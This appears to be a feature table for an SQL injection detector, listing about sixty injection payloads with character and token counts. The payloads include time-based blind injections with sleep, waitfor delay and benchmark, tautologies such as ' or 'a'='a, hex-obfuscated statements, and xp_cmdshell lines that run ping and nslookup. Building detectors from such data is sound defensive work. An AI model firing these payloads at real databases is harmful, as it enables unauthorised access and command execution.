attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length
" or sleep(__time__)#	2	1	0	1	2	0	2	21
' or sleep(__time__)#	2	1	0	1	2	0	2	21
" or sleep(__time__)="	3	1	0	1	2	0	2	22
' or sleep(__time__)='	3	1	0	1	2	0	2	22
") or sleep(__time__)="	3	1	0	1	3	0	2	23
') or sleep(__time__)='	3	1	0	1	3	0	2	23
")) or sleep(__time__)="	3	1	0	1	4	0	2	24
')) or sleep(__time__)='	3	1	0	1	4	0	2	24
;waitfor delay '0:0:__time__'--	2	2	0	0	6	2	2	31
);waitfor delay '0:0:__time__'--	2	2	0	0	7	2	2	32
';waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32
";waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32
');waitfor delay '0:0:__time__'--	3	2	0	0	7	2	2	33
");waitfor delay '0:0:__time__'--	3	2	0	0	7	2	2	33
));waitfor delay '0:0:__time__'--	2	2	0	0	8	2	2	33
'));waitfor delay '0:0:__time__'--	3	2	0	0	8	2	2	34
"));waitfor delay '0:0:__time__'--	3	2	0	0	8	2	2	34
1 or benchmark(10000000,md5(1))#	1	3	0	0	5	3	2	32
" or benchmark(10000000,md5(1))#	2	3	0	0	5	2	2	32
' or benchmark(10000000,md5(1))#	2	3	0	0	5	2	2	32
1) or benchmark(10000000,md5(1))#	1	3	0	0	6	3	2	33
") or benchmark(10000000,md5(1))#	2	3	0	0	6	2	2	33
') or benchmark(10000000,md5(1))#	2	3	0	0	6	2	2	33
1)) or benchmark(10000000,md5(1))#	1	3	0	0	7	3	2	34
")) or benchmark(10000000,md5(1))#	2	3	0	0	7	2	2	34
')) or benchmark(10000000,md5(1))#	2	3	0	0	7	2	2	34
) or ('x'='x	4	1	0	0	3	0	2	12
; execute immediate 'sel' || 'ect us' || 'er'	8	1	0	0	4	0	8	45
";waitfor delay '0:0:__time__'--	3	2	0	0	6	2	2	32
||(elt(-3+5,bin(15),ord(10),hex(char(45))))	1	5	0	0	17	5	0	43
"hi"") or (""a""=""a"	11	1	2	0	2	0	2	21
" or sleep(__time__)#	2	1	0	1	2	0	2	21
) or ('a'='a	4	1	2	0	3	0	2	12
@var select @var as var into temp end --	0	4	0	0	4	2	8	40
1)) or benchmark(10000000,md5(1))#	1	3	0	0	7	3	2	34
"a"" or 3=3--"	5	1	1	0	2	2	2	14
" or benchmark(10000000,md5(1))#	2	3	0	0	5	2	2	32
1 waitfor delay '0:0:10'--	2	2	0	0	5	4	3	26
 or 'a'='a	4	1	2	0	1	0	2	10
or a = a	1	1	2	0	0	0	3	8
) or sleep(__time__)='	2	1	0	1	3	0	2	22
)) or benchmark(10000000,md5(1))#	1	3	0	0	7	2	2	33
hi' or 'a'='a	5	1	2	0	1	0	2	13
")) or benchmark(10000000,md5(1))#	2	3	0	0	7	2	2	34
hi') or ('a'='a	5	1	2	0	3	0	2	15
));waitfor delay '0:0:__time__'--	2	2	0	0	8	2	2	33
a' waitfor delay '0:0:10'--	3	2	1	0	5	3	3	27
 or '7659'='7659	4	1	0	0	1	2	2	16
 or 'text' = n'text'	5	1	0	0	1	0	4	20
 or 1=1 or ''='	5	2	0	0	1	2	4	15
declare @s varchar (200) select @s = 0x73656c6 ...	1	2	2	0	7	3	8	50
; exec master..xp_cmdshell 'ping 172.10.1.255'--	2	3	0	0	9	4	4	48
 or 'unusual' = 'unusual'	5	1	0	0	2	0	4	25
1) or benchmark(10000000,md5(1))#	1	3	0	0	6	3	2	33
declare @s varchar(200) select @s = 0x77616974 ...	1	2	2	0	7	3	7	50
"));waitfor delay '0:0:__time__'--	3	2	0	0	8	2	2	34
or a=a	1	1	2	0	0	0	1	6
" or "a"="a	5	1	2	0	0	0	2	11
 and 1=( if((load_file(char(110,46,101,120,11 ...	1	3	1	0	8	1	4	49
t'exec master..xp_cmdshell 'nslookup www.googl ...	2	2	0	0	7	0	4	50
